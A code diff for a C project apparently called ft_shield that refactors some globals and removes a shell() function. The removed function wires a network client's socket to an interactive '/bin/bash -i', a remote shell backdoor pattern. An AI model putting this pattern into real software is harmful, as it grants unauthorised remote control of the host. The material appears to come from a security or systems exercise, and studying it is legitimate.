@@ -1,8 +1,7 @@
 #include "../ft_shield.h"
 
-int	g_shelllvl = 0;
-int	g_shelling = 0;
-int	g_shells[1024];
+extern int	g_shelling;
+extern int	g_shells[BACKLOG];
 
 void	prompt(int fd)
 {
@@ -10,34 +9,7 @@ void	prompt(int fd)
 		write(fd, PROMPT, sizeof PROMPT);
 }
 
-void	shell(int cfd, int epfd)
-{
-	pid_t	mypid;
-	pid_t	cpid;
-
-	g_shells[cfd] = 1;
-	++g_shelllvl;
-	mypid = getpid();
-	if (fork() == 0)
-	{
-		cpid = fork();
-		if (cpid == 0)
-		{
-			dup2(cfd, STDIN_FILENO);
-			dup2(cfd, STDOUT_FILENO);
-			dup2(cfd, STDERR_FILENO);
-			execl("/bin/bash", "bash", "-i", NULL);
-		}
-		else
-		{
-			waitpid(cpid, NULL, 0);
-			kill(mypid, SIGUSR1);
-			exit_client(cfd, epfd);
-		}
-	}
-}
-
-void	handle_command(int cfd, int epfd)
+void	handle_command(int epfd, int cfd)
 {
 	char	buf[4096];
 	ssize_t	n;
